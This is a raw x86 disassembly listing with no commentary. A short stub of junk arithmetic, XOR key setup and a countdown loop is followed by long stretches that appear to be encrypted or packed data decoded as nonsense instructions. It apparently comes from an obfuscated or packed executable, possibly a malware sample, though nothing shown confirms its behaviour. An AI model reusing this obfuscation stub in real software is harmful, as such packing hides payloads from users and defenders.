  40183f:	cli    
  401840:	ss dec eax
  401842:	mov    bh,0x13
  401844:	dec    ecx
  401845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401846:	mov    ebp,0x897b7c03
  40184b:	inc    ebp
  40184c:	loopne 0x401845
  40184e:	sbb    eax,0x430496
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e762,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x430546,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430542,0x13
  401884:	cmp    DWORD PTR ds:0x430542,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430542,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eaa4
  4018a9:	mov    ebx,DWORD PTR ds:0x430542
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430542,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e75e,0x42e762
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4304b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e76a,0x430542
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430552,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	(bad)  
  401915:	adc    ebp,DWORD PTR [eax+0x7e751672]
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x4018d1
  401921:	ret    
  401922:	hlt    
  401923:	adc    dl,bh
  401925:	pop    edi
  401926:	mov    ds:0x889a1970,al
  40192b:	leave  
  40192c:	add    bh,ch
  40192e:	xor    esi,DWORD PTR [eax-0x17b3daf8]
  401934:	imul   ecx,DWORD PTR [eax-0x1cc09b6d],0x7e23e4a6
  40193e:	aad    0xc2
  401940:	sub    BYTE PTR [ecx],ch
  401942:	push   esp
  401943:	mov    ds:0x2b2b11e8,eax
  401948:	jge    0x40198d
  40194a:	test   eax,0x9c5858bc
  40194f:	cli    
  401950:	and    dl,bl
  401952:	test   eax,0x1acbed04
  401957:	push   ebx
  401958:	sbb    al,0xde
  40195a:	mov    al,0x17
  40195c:	xor    al,0x8d
  40195e:	call   0xa90a0e6a
  401963:	mov    dl,ah
  401965:	mov    BYTE PTR [ebp-0x7d],ah
  401968:	cmp    DWORD PTR [edx],ebx
  40196a:	es mov ecx,eax
  40196d:	dec    ebx
  40196e:	daa    
  40196f:	test   eax,esi
  401971:	fistp  QWORD PTR [edx-0x56]
  401974:	cmp    DWORD PTR [eax],ebx
  401976:	shl    DWORD PTR [ebx-0x75acdf3f],0xbe
  40197d:	rcl    DWORD PTR [esi+0x7b],cl
  401980:	retf   
  401981:	push   esp
  401982:	jg     0x4019ad
  401984:	jno    0x40195b
  401986:	mov    al,ds:0x184ba367
  40198b:	xor    al,0x8d
  40198d:	jnp    0x401946
  40198f:	icebp  
  401990:	sub    ecx,DWORD PTR [edx+0x2f]
  401993:	popf   
  401994:	leave  
  401995:	daa    
  401996:	test   DWORD PTR [edi+0x19],edx
  401999:	and    eax,0x211cc158
  40199e:	pop    esp
  40199f:	jecxz  0x401949
  4019a1:	push   es
  4019a2:	sbb    DWORD PTR [edx],edi
  4019a4:	mov    al,ds:0xa55b0834
  4019a9:	cdq    
  4019aa:	push   ecx
  4019ab:	outs   dx,BYTE PTR ds:[esi]
  4019ac:	test   al,0x95
  4019ae:	adc    BYTE PTR [edx+0x1],0xf7
  4019b2:	xor    eax,0xd303638c
  4019b7:	push   cs
  4019b8:	push   ss
  4019b9:	jecxz  0x4019f6
  4019bb:	cmp    BYTE PTR [edx+0x278dc68c],al
  4019c1:	in     eax,0xed
  4019c3:	xchg   ebp,eax
  4019c4:	inc    esi
  4019c5:	adc    ecx,DWORD PTR cs:[edx]
  4019c8:	retf   
  4019c9:	jmp    0x7a85:0xa0f43ac0
  4019d0:	retf   0x6fdc
  4019d3:	add    ah,bl
  4019d5:	adc    esi,DWORD PTR [esi-0x1]
  4019d8:	mov    WORD PTR [edi],?
  4019da:	mov    bl,0x5b
  4019dc:	jmp    0x4e6d:0xbe78e35e
  4019e3:	dec    eax
  4019e4:	hlt    
  4019e5:	ss cwde 
  4019e7:	xchg   ebp,eax
  4019e8:	aad    0x0
  4019ea:	scas   al,BYTE PTR es:[edi]
  4019eb:	icebp  
  4019ec:	ja     0x401a4c
  4019ee:	enter  0xb955,0xb3
  4019f2:	add    dl,ah
  4019f4:	pop    ecx
  4019f5:	push   edi
  4019f6:	(bad)  
  4019f7:	pushf  
  4019f8:	fild   DWORD PTR [ebx+0x2d]
  4019fb:	icebp  
  4019fc:	das    
  4019fd:	push   edx
  4019fe:	push   ebp
  4019ff:	jmp    0xf34fb1b5
  401a04:	(bad)  
  401a05:	mov    dh,0x2
  401a07:	jmp    0x29eb:0x24155847
  401a0e:	mov    cl,0xbc
  401a10:	mov    eax,ds:0x43fef4e1
  401a15:	xchg   ecx,eax
  401a16:	lods   eax,DWORD PTR ds:[esi]
  401a17:	into   
  401a18:	mov    ebx,0x9d43163f
  401a1d:	enter  0x9333,0x3e
  401a21:	mov    esp,0xed097848
  401a26:	jg     0x401a24
  401a28:	pusha  
  401a29:	pop    esp
  401a2a:	imul   ebx,DWORD PTR [esi+0x62],0xeaebbf0e
  401a31:	adc    eax,0xb0761f6f
  401a36:	ins    DWORD PTR es:[edi],dx
  401a37:	mov    bl,BYTE PTR [eax]
  401a39:	sub    BYTE PTR [ebp-0x2745d689],ah
  401a3f:	mov    ecx,eax
  401a41:	mov    ds:0x8bd8a92a,eax
  401a46:	int    0x81
  401a48:	pop    ebp
  401a49:	test   BYTE PTR [edi],bh
  401a4b:	mov    ecx,0xcf22b46c
  401a50:	(bad)  
  401a51:	or     al,0xe0
  401a53:	test   ebx,edi
  401a55:	fwait
  401a56:	(bad)  
  401a57:	jp     0x401a69
  401a59:	ins    BYTE PTR es:[edi],dx
  401a5a:	push   esi
  401a5b:	pop    eax
  401a5c:	cld    
  401a5d:	or     eax,DWORD PTR [ebp+eax*4+0x31]
  401a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a62:	jp     0x4019f9
  401a64:	add    eax,0x29044840
  401a69:	sti    
  401a6a:	loope  0x401ac2
  401a6c:	call   0x3805:0xb68fbb13
  401a73:	inc    edx
  401a74:	mov    esi,0x8920b2d7
  401a79:	icebp  
  401a7a:	outs   dx,DWORD PTR ds:[esi]
  401a7b:	shl    DWORD PTR [ebp-0x3f],cl
  401a7e:	cli    
  401a7f:	in     eax,dx
  401a80:	out    0xdb,al
  401a82:	push   esp
  401a83:	or     edi,DWORD PTR [ebp+0x6f]
  401a86:	scas   al,BYTE PTR es:[edi]
  401a87:	jno    0x401a41
  401a89:	push   0x6f7c74c5
  401a8e:	push   es
  401a8f:	inc    esp
  401a90:	xor    BYTE PTR [ebx+0x68525a77],al
  401a96:	mov    ecx,0x419798b5
  401a9b:	mov    esi,0xe471444a
  401aa0:	xchg   ebx,eax
  401aa1:	sahf   
  401aa2:	inc    esp
  401aa3:	and    esi,DWORD PTR [eax-0x77e9060]
  401aa9:	inc    ecx
  401aaa:	daa    
  401aab:	lock xchg ebp,eax
  401aad:	pop    ebx
  401aae:	shr    DWORD PTR [edx+0x6e],1
  401ab1:	test   al,0xf7
  401ab3:	jo     0x401ae7
  401ab5:	jecxz  0x401a3c
  401ab7:	mov    edi,0xa865df09
  401abc:	ss cmp eax,0x6e66b9bf
  401ac2:	enter  0x7944,0x88
  401ac6:	cmc    
  401ac7:	jmp    0x8b59f6c8
  401acc:	repz retfw 0xd064
  401ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ad2:	mov    ch,0xbc
  401ad4:	jmp    DWORD PTR [ebp-0xd]
  401ad7:	out    0xc7,eax
  401ad9:	out    dx,eax
  401ada:	xlat   BYTE PTR ds:[ebx]
  401adb:	ret    
  401adc:	xor    ah,dh
  401ade:	jne    0x401ade
  401ae0:	scas   al,BYTE PTR es:[edi]
  401ae1:	mov    dh,0x4d
  401ae3:	pop    es
  401ae4:	addr16 mov dl,bl
  401ae7:	xor    eax,esi
  401ae9:	popa   
  401aea:	rcl    DWORD PTR [esi-0x6b],0xdb
  401aee:	aam    0x52
  401af0:	or     BYTE PTR [edx+0x3974dd6e],ch
  401af6:	mov    esp,0x13943d9
  401afb:	mov    ah,0xdf
  401afd:	xchg   esp,eax
  401afe:	pop    es
  401aff:	loope  0x401ae7
  401b01:	inc    esi
  401b02:	mov    eax,0x32f806f5
  401b07:	or     DWORD PTR [ebx+ebx*2+0x3f],ebx
  401b0b:	fcom   QWORD PTR [edi-0x43]
  401b0e:	sub    BYTE PTR [eax+0x5ed897d1],0xcd
  401b15:	xchg   DWORD PTR [edi-0x59],ebp
  401b18:	xchg   ebp,eax
  401b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b1a:	push   es
  401b1b:	imul   DWORD PTR [ebx+eax*2-0x5ae582b1]
  401b22:	xor    eax,DWORD PTR [esi+0x3cd6cdf]
  401b28:	pop    cx
  401b2a:	or     eax,0x24d500c4
  401b2f:	icebp  
  401b30:	test   BYTE PTR [eax],cl
  401b32:	push   cs
  401b33:	inc    edx
  401b34:	(bad)  
  401b35:	and    eax,0x70ee6192
  401b3a:	or     dh,BYTE PTR [ebp+eax*4-0x34]
  401b3e:	mov    BYTE PTR [ecx+0x29],ah
  401b41:	aas    
  401b42:	sub    cl,BYTE PTR [eax+ecx*4-0x7d]
  401b46:	out    dx,al
  401b47:	push   ds
  401b48:	pop    ebx
  401b49:	std    
  401b4a:	js     0x401b23
  401b4c:	out    0x1e,eax
  401b4e:	adc    al,0xa0
  401b50:	cmp    BYTE PTR [eax],al
  401b52:	nop
  401b53:	add    esp,DWORD PTR [edi+0x42]
  401b56:	scas   eax,DWORD PTR es:[edi]
  401b57:	xchg   edx,eax
  401b58:	in     eax,dx
  401b59:	scas   eax,DWORD PTR es:[edi]
  401b5a:	jo     0x401b49
  401b5c:	pop    esi
  401b5d:	nop
  401b5e:	mov    bl,0x6a
  401b60:	mov    ch,0x5f
  401b62:	and    DWORD PTR [esi-0x36c0a85b],0x31dc3926
  401b6c:	xor    ecx,edx
  401b6e:	adc    eax,0x2ad07710
  401b73:	sbb    BYTE PTR [edi+0x3aa2dbe6],0xbd
  401b7a:	or     ebx,DWORD PTR [ecx-0x52]
  401b7d:	adc    esp,DWORD PTR [ecx-0x7e5e0271]
  401b83:	jl     0x401b23
  401b85:	loopne 0x401bf3
  401b87:	adc    al,0x41
  401b89:	clc    
  401b8a:	xor    al,0x62
  401b8c:	jb     0x401bbe
  401b8e:	rcr    BYTE PTR [ebx],0x21
  401b91:	xor    eax,0xafb11ae4
  401b96:	pop    ds
  401b97:	and    DWORD PTR [ebx+edi*2+0x463538f4],edi
  401b9e:	cli    
  401b9f:	es inc edx
  401ba1:	adc    eax,0x72f86409
  401ba6:	rol    BYTE PTR [eax-0x6d],cl
  401ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401baa:	pusha  
  401bab:	retf   0xa1fc
  401bae:	lock and eax,0x1695826b
  401bb4:	fsubr  st(3),st
  401bb6:	sbb    eax,0x51762807
  401bbb:	cwde   
  401bbc:	bound  esi,QWORD PTR [edx-0x6b]
  401bbf:	sar    DWORD PTR [edx],0x7c
  401bc2:	add    bh,BYTE PTR [eax+0x38d0523e]
  401bc8:	and    DWORD PTR [esi],esi
  401bca:	(bad)  
  401bcb:	jmp    0x401b57
  401bcd:	or     al,0x6c
  401bcf:	jno    0x401bbe
  401bd1:	xor    eax,0x6d3692f4
  401bd6:	pop    edi
  401bd7:	jmp    0x7eb5c7f2
  401bdc:	mov    ch,0x32
  401bde:	xor    eax,0x9e6b6cdd
  401be3:	sub    DWORD PTR [esi],eax
  401be5:	and    ch,BYTE PTR [edi+esi*4-0x132e33e6]
  401bec:	xchg   ebp,eax
  401bed:	cmp    esi,ebp
  401bef:	fdiv   QWORD PTR [esi+0x1324186d]
  401bf5:	cmc    
  401bf6:	adc    bl,bl
  401bf8:	lahf   
  401bf9:	xchg   BYTE PTR [ebx+0x44],bh
  401bfc:	cs stos DWORD PTR es:[edi],eax
  401bfe:	push   ss
  401bff:	lea    eax,[esi-0x525701e7]
  401c05:	leave  
  401c06:	inc    ecx
  401c07:	jne    0x401c7e
  401c09:	inc    esi
  401c0a:	pop    edi
  401c0b:	scas   eax,DWORD PTR es:[edi]
  401c0c:	cmp    cl,BYTE PTR [esi+ecx*1-0x7d3205f5]
  401c13:	jne    0x401bf2
  401c15:	sub    eax,0xd1e408ef
  401c1a:	dec    esi
  401c1b:	add    esi,esi
  401c1d:	dec    esp
  401c1e:	xchg   BYTE PTR [ecx+edi*2-0x5e],cl
  401c22:	or     ecx,esp
  401c24:	or     dl,BYTE PTR [esi+ecx*4]
  401c27:	aaa    
  401c28:	sbb    ah,BYTE PTR [eax-0x37]
  401c2b:	hlt    
  401c2c:	mov    edi,DWORD PTR [edi]
  401c2e:	xchg   dl,ah
  401c30:	dec    edi
  401c31:	pop    esp
  401c32:	add    eax,0xd124f540
  401c37:	enter  0xbd55,0x49
  401c3b:	outs   dx,BYTE PTR ds:[esi]
  401c3c:	sbb    DWORD PTR [ecx-0x10],esi
  401c3f:	sub    BYTE PTR [edx+edi*4],al
  401c42:	std    
  401c43:	xchg   BYTE PTR [edx],al
  401c45:	mov    dh,0xc6
  401c47:	test   eax,0xfd32397b
  401c4c:	cmp    ecx,DWORD PTR [ebx-0xe]
  401c4f:	xchg   edi,eax
  401c50:	jae    0x401bfa
  401c52:	outs   dx,BYTE PTR ds:[esi]
  401c53:	out    0x8b,eax
  401c55:	add    dl,0x3b
  401c58:	push   0xd05b5719
  401c5d:	imul   ebx,DWORD PTR [ebp*2+0x6debad5a],0x6f
  401c65:	mov    ds:0xfb48d10a,al
  401c6a:	(bad)  
  401c6b:	fsubr  DWORD PTR [edx-0x61]
  401c6e:	and    BYTE PTR [eax],ah
  401c70:	jne    0x401cb3
  401c72:	and    eax,0xdf337f5b
  401c77:	inc    ecx
  401c78:	dec    eax
  401c79:	pop    ecx
  401c7a:	popf   
  401c7b:	ins    DWORD PTR es:[edi],dx
  401c7c:	lods   eax,DWORD PTR ds:[esi]
  401c7d:	je     0x401c88
  401c7f:	jno    0x401cfc
  401c81:	xchg   BYTE PTR [ebx-0x6977ae7],ch
  401c87:	xor    bl,dh
  401c89:	and    ebp,DWORD PTR [edx]
  401c8b:	add    ebx,DWORD PTR [edx-0x42]
  401c8e:	jmp    DWORD PTR [ebp+0x312d5b8f]
  401c94:	stc    
  401c95:	ret    
  401c96:	pop    edx
  401c97:	jns    0x401cdb
  401c99:	es adc esp,edi
  401c9c:	cmp    ecx,DWORD PTR [edx-0x1e]
  401c9f:	dec    edi
  401ca0:	fldenv [ecx]
  401ca2:	popa   
  401ca3:	jecxz  0x401cfb
  401ca5:	sahf   
  401ca6:	or     esi,DWORD PTR gs:[edx-0x6b]
  401caa:	gs xchg esi,eax
  401cac:	jbe    0x401d21
  401cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401caf:	sub    ecx,DWORD PTR [ebx-0x898fed0]
  401cb5:	xrelease mov DWORD PTR ds:0x42ee20,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401c5d
  401cd2:	aaa    
  401cd3:	aaa    
  401cd4:	inc    ebx
  401cd5:	mov    edx,0x827e7e08
  401cda:	jno    0x401d5a
  401cdc:	jle    0x401ceb
  401cde:	out    0x9,al
  401ce0:	mov    WORD PTR [ecx],gs
  401ce2:	mov    al,0x38
  401ce4:	fs xchg eax,ebp
  401ce7:	(bad)  
  401ce8:	cdq    
  401ce9:	push   ds
  401cea:	call   0x886ac62f
  401cef:	inc    eax
  401cf0:	jp     0x401d44
  401cf2:	cs repz sahf 
  401cf5:	mov    WORD PTR [esi],gs
  401cf7:	hlt    
  401cf8:	cdq    
  401cf9:	mov    WORD PTR [edx+esi*2+0x8],cs
  401cfd:	mov    al,0xac
  401cff:	mov    edi,0x1777a822
  401d04:	mov    ebp,0xa5425e98
  401d09:	inc    edx
  401d0a:	and    eax,DWORD PTR [eax-0x32]
  401d0d:	sti    
  401d0e:	sbb    BYTE PTR [eax+0x57],ch
  401d11:	and    ebp,DWORD PTR [esi]
  401d13:	cmp    DWORD PTR [ebx-0x7d],ebx
  401d16:	cmc    
  401d17:	pop    es
  401d18:	mov    dh,0x85
  401d1a:	add    DWORD PTR [edi-0xe93466f],edi
  401d20:	dec    ecx
  401d21:	sub    dh,BYTE PTR [eax+edx*4+0x20bba057]
  401d28:	(bad)  [ebx+0xf0407ee]
  401d2e:	mov    ebp,0xe7f5431d
  401d33:	in     al,dx
  401d34:	ror    DWORD PTR [edi-0x6],1
  401d37:	cmp    ah,dh
  401d39:	mov    esp,edi
  401d3b:	mov    edx,0xab9bba0f
  401d40:	aaa    
  401d41:	jnp    0x401db9
  401d43:	mov    esp,0xe546d050
  401d48:	mov    esp,0x35e057fa
  401d4d:	(bad)  [edx+0x12229b8d]
  401d53:	sbb    al,0xb6
  401d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d56:	sbb    ebp,ebp
  401d58:	ret    0x8c02
  401d5b:	push   es
  401d5c:	ins    DWORD PTR es:[edi],dx
  401d5d:	and    eax,0x74a0dfee
  401d62:	les    edx,FWORD PTR [esi+ecx*8]
  401d65:	int3   
  401d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d67:	lods   eax,DWORD PTR ds:[esi]
  401d68:	cmp    eax,0xb6f39998
  401d6d:	stos   BYTE PTR es:[edi],al
  401d6e:	test   DWORD PTR [eax-0x70],edx
  401d71:	int    0x1c
  401d73:	sbb    cl,ch
  401d75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d76:	aas    
  401d77:	test   BYTE PTR [ebx+edi*2-0x4781e5c2],bl
  401d7e:	mov    WORD PTR [ecx],fs
  401d80:	add    bl,al
  401d82:	sbb    DWORD PTR [edx+0x7d],esp
  401d85:	adc    eax,DWORD PTR ds:0xfc244e48
  401d8b:	div    BYTE PTR [edx-0x13]
  401d8e:	in     eax,dx
  401d8f:	add    edx,DWORD PTR [edx+0x77ef4cb1]
  401d95:	retf   0x2fb1
  401d98:	out    dx,al
  401d99:	imul   esp,DWORD PTR [esi-0x1],0x5a41460
  401da0:	clc    
  401da1:	fnstsw WORD PTR [edi-0x79c9418e]
  401da7:	in     eax,dx
  401da8:	fwait
  401da9:	js     0x401dee
  401dab:	out    0x8e,al
  401dad:	dec    ecx
  401dae:	gs leave 
  401db0:	pop    ebx
  401db1:	shl    BYTE PTR [ecx+ebx*2],1
  401db4:	jae    0x401d98
  401db6:	cmp    esp,DWORD PTR [eax+0x79]
  401db9:	sbb    esp,DWORD PTR [ebx+0x38]
  401dbc:	das    
  401dbd:	pop    edx
  401dbe:	frstor [eax+0x76]
  401dc1:	lods   al,BYTE PTR ds:[esi]
  401dc2:	call   0x82b9ef7a
  401dc7:	das    
  401dc8:	(bad)  
  401dc9:	(bad)
  401dcc:	popf   
  401dcd:	dec    ecx
  401dce:	push   ecx
  401dcf:	(bad)  [ebp+0x7e916ccb]
  401dd5:	daa    
  401dd6:	inc    edi
  401dd7:	in     eax,0xa
  401dd9:	push   ebx
  401dda:	mov    WORD PTR [esp+edi*8+0x78],ds
  401dde:	mov    ds:0x259d853e,al
  401de3:	sub    dl,BYTE PTR [esi+0x36]
  401de6:	xlat   BYTE PTR ds:[ebx]
  401de7:	(bad)  
  401de8:	and    bl,ch
  401dea:	sbb    edi,edi
  401dec:	adc    BYTE PTR [di],ah
  401def:	and    bh,BYTE PTR [edx-0x499e3467]
  401df5:	(bad)  [ebp+0x4645b338]
  401dfb:	cmp    ebp,DWORD PTR [esi+0x174111d4]
  401e01:	pop    eax
  401e02:	pusha  
  401e03:	fdivr  QWORD PTR [edx+0x32]
  401e06:	ror    esp,0xaa
  401e09:	or     DWORD PTR [eax-0x48900889],ecx
  401e0f:	frstor [edi-0x4db2f8e3]
  401e15:	loop   0x401e3c
  401e17:	mov    BYTE PTR [ecx+esi*4],0x6d
  401e1b:	add    dl,ah
  401e1d:	arpl   WORD PTR [esi-0xa],dx
  401e20:	mov    al,0x4
  401e22:	xor    DWORD PTR [esi+edx*1+0x1d0fc082],ebp
  401e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e2a:	or     esp,DWORD PTR [ebx+0x2a19d811]
  401e30:	(bad)  
  401e32:	(bad)  
  401e33:	mov    cl,0x29
  401e35:	push   esp
  401e36:	push   0xfffffffe
  401e38:	scas   eax,DWORD PTR es:[edi]
  401e39:	(bad)  
  401e3a:	mov    ebp,0x3af8060
  401e3f:	push   eax
  401e40:	enter  0xd741,0x51
  401e44:	leave  
  401e45:	xor    esi,DWORD PTR [ebp-0x43e83a23]
  401e4b:	or     ch,BYTE PTR fs:[edx]
  401e4e:	jno    0x401ec4
  401e50:	push   esp
  401e51:	es pop edi
  401e53:	push   cs
  401e54:	inc    ecx
  401e55:	(bad)
  401e58:	or     al,0xe4
  401e5a:	shl    DWORD PTR [edi],cl
  401e5c:	push   ss
  401e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e5e:	jb     0x401e9c
  401e60:	adc    BYTE PTR ds:0x7f25c0cb,0xb0
  401e67:	inc    edi
  401e68:	sbb    al,BYTE PTR [ebx-0x2f]
  401e6b:	fldpi  
  401e6d:	lods   eax,DWORD PTR ds:[esi]
  401e6e:	mov    eax,ds:0xc9570375
  401e73:	mov    esp,DWORD PTR [eax]
  401e75:	adc    DWORD PTR [edx-0x44],esi
  401e78:	call   0x373d5341
  401e7d:	pop    ecx
  401e7e:	pop    es
  401e7f:	mov    ah,0xc8
  401e81:	push   ebx
  401e82:	loop   0x401ef4
  401e84:	out    dx,al
  401e85:	mov    bh,0xbb
  401e87:	xor    ah,BYTE PTR [ebx]
  401e89:	retf   0x1a3c
  401e8c:	in     al,0xcc
  401e8e:	call   0x3d03bf36
  401e93:	push   0xfffffffe
  401e95:	stc    
  401e96:	jg     0x401e67
  401e98:	sbb    esp,ebx
  401e9a:	inc    ecx
  401e9b:	aas    
  401e9c:	cmc    
  401e9d:	adc    esp,DWORD PTR [ecx]
  401e9f:	mov    edi,0xd9c907c3
  401ea4:	call   0x1a709b76
  401ea9:	mov    edx,0x803b15d7
  401eae:	mov    al,0x48
  401eb0:	les    ecx,FWORD PTR [ebp+0x5638eaef]
  401eb6:	stos   DWORD PTR es:[edi],eax
  401eb7:	adc    ah,BYTE PTR [esp+ebx*2]
  401eba:	sti    
  401ebb:	mov    BYTE PTR [ebp-0x7396b31c],0x61
  401ec2:	aam    0x42
  401ec4:	cmp    edx,DWORD PTR [eax]
  401ec6:	xor    DWORD PTR [edx-0x40c82d7c],ebp
  401ecc:	stc    
  401ecd:	loop   0x401f26
  401ecf:	push   esp
  401ed0:	cli    
  401ed1:	int    0x62
  401ed3:	test   DWORD PTR [edx+0x50],edx
  401ed6:	xor    eax,0xbe4ecaca
  401edb:	pop    ecx
  401edc:	out    0xa,eax
  401ede:	je     0x401f38
  401ee0:	(bad)  
  401ee1:	ror    DWORD PTR [eax-0xe3c41bb],cl
  401ee7:	gs je  0x401f05
  401eea:	push   0xa62576cb
  401eef:	mov    gs,edx
  401ef1:	pop    edx
  401ef2:	jnp    0x401e99
  401ef4:	adc    edx,edi
  401ef6:	add    ebp,DWORD PTR [edi+ecx*2]
  401ef9:	mov    dh,BYTE PTR [esi+0x1c]
  401efc:	shr    ecx,0xa6
  401eff:	scas   eax,DWORD PTR es:[edi]
  401f00:	push   ecx
  401f01:	or     ebp,DWORD PTR [esi-0x3e]
  401f04:	mov    dh,0xcb
  401f06:	jl     0x401e90
  401f08:	sub    al,0xf9
  401f0a:	fwait
  401f0b:	mov    edi,0xbfd44bdb
  401f10:	out    dx,al
  401f11:	pop    edx
  401f12:	in     eax,dx
  401f13:	push   esp
  401f14:	jae    0x401f2b
  401f16:	cmp    eax,0x6dfbe948
  401f1b:	mov    ah,0xe3
  401f1d:	and    bl,BYTE PTR [ebx+0x3fd8fabd]
  401f23:	mov    ch,BYTE PTR [ecx-0x28]
  401f26:	pop    es
  401f27:	shr    BYTE PTR [eax+esi*8],1
  401f2a:	iret   
  401f2b:	mov    BYTE PTR [ebp+0x7b1c0364],cl
  401f31:	and    al,0xbe
  401f33:	out    dx,al
  401f34:	cmc    
  401f35:	sbb    esi,edx
  401f37:	mov    ds:0x71c0cb67,al
  401f3c:	das    
  401f3d:	outs   dx,DWORD PTR ds:[esi]
  401f3e:	imul   eax,DWORD PTR [ebx],0xc78bb158
  401f44:	and    esp,esp
  401f46:	inc    edx
  401f47:	sub    BYTE PTR ds:0x689a6a34,0xf0
  401f4e:	stc    
  401f4f:	xchg   esi,eax
  401f50:	(bad)
  401f54:	pop    eax
  401f55:	xchg   edx,eax
  401f56:	mov    ebx,0xd8596a72
  401f5b:	adc    esi,0x2b8fc5ee
  401f61:	dec    ebp
  401f62:	enter  0xeccb,0x12
  401f66:	sbb    eax,0x3611d3fa
  401f6b:	imul   ecx,ebp,0xffffffd6
  401f6e:	out    dx,eax
  401f6f:	push   eax
  401f70:	mov    ds:0x8fb72740,eax
  401f75:	inc    eax
  401f76:	pop    esi
  401f77:	xchg   edi,eax
  401f78:	dec    edi
  401f79:	and    DWORD PTR [ecx+0x2a],ecx
  401f7c:	scas   eax,DWORD PTR es:[edi]
  401f7d:	rcr    BYTE PTR [ebx+ecx*1],cl
  401f80:	adc    dl,al
  401f82:	enter  0xa676,0xff
  401f86:	cld    
  401f87:	jl     0x401ffb
  401f89:	jae    0x401f84
  401f8b:	push   cs
  401f8c:	dec    esp
  401f8d:	cdq    
  401f8e:	mov    edx,DWORD PTR ds:[esi+ebp*1-0x1a]
  401f93:	cdq    
  401f94:	push   eax
  401f95:	push   esp
  401f96:	mov    edx,0x952c6913
  401f9b:	pop    ebx
  401f9c:	cmp    bl,BYTE PTR [ebx+0xc4b22c2]
  401fa2:	inc    ecx
  401fa3:	dec    esi
  401fa4:	pop    ss
  401fa5:	fist   WORD PTR [ebx+0x42]
  401fa8:	cdq    
  401fa9:	mov    bl,BYTE PTR [ebx+0x67]
  401fac:	iret   
  401fad:	push   0xbd745db8
  401fb2:	sbb    ebx,DWORD PTR [esi+0xb]
  401fb5:	dec    ecx
  401fb6:	pop    ss
  401fb7:	aam    0xfc
  401fb9:	mov    al,ds:0xa93e469a
  401fbe:	pop    edi
  401fbf:	pop    edx
  401fc0:	js     0x401fde
  401fc2:	jbe    0x401f57
  401fc4:	mov    WORD PTR [esi+0x77],?
  401fc7:	sub    bh,BYTE PTR [ebx+ebp*4+0x44]
  401fcb:	mov    DWORD PTR [ebp+0x3a61b090],0xc5aa8968
  401fd5:	xor    DWORD PTR [ecx],esi
  401fd7:	add    al,0x59
  401fd9:	ds bnd jbe 0x402019
  401fdd:	sbb    BYTE PTR [edi],0xf9
  401fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fe1:	mov    esp,0x7367c8f3
  401fe6:	jg     0x401f7b
  401fe8:	fisubr DWORD PTR [eax+ebp*2-0x6]
  401fec:	cld    
  401fed:	add    eax,0x1687a001
  401ff2:	aas    
  401ff3:	mov    ebp,0x156174a0
  401ff8:	sbb    DWORD PTR [edx+0x72],ebp
  401ffb:	jns    0x402048
  401ffd:	xchg   edx,eax
  401ffe:	ins    BYTE PTR es:[edi],dx
  401fff:	pop    edi
  402000:	inc    ebx
  402001:	stc    
  402002:	push   ecx
  402003:	adc    eax,0xaaa67c10
  402008:	sub    esi,DWORD PTR [edi]
  40200a:	push   esi
  40200b:	aam    0xd
  40200d:	mov    al,ds:0xa8122e6f
  402012:	mov    WORD PTR [esi+0x3437ceae],ss
  402018:	mov    ebp,0x41aecd2e
  40201d:	or     al,0x2
  40201f:	fld    QWORD PTR [ecx+0x47]
  402022:	jnp    0x402058
  402024:	or     ecx,DWORD PTR [esi-0x17]
  402027:	stc    
  402028:	pop    edx
  402029:	test   eax,0x96a948c7
  40202e:	inc    esp
  40202f:	mov    dh,BYTE PTR [edx-0x5df7fd59]
  402035:	push   ss
  402036:	mov    edx,0x60dfcbcc
  40203b:	sahf   
  40203c:	ror    BYTE PTR [ebx],cl
  40203e:	cwde   
  40203f:	inc    ebx
  402040:	cmc    
  402041:	leave  
  402042:	addr16 repnz shl ch,1
  402046:	lods   al,BYTE PTR ds:[esi]
  402047:	pop    eax
  402048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402049:	ret    
  40204a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
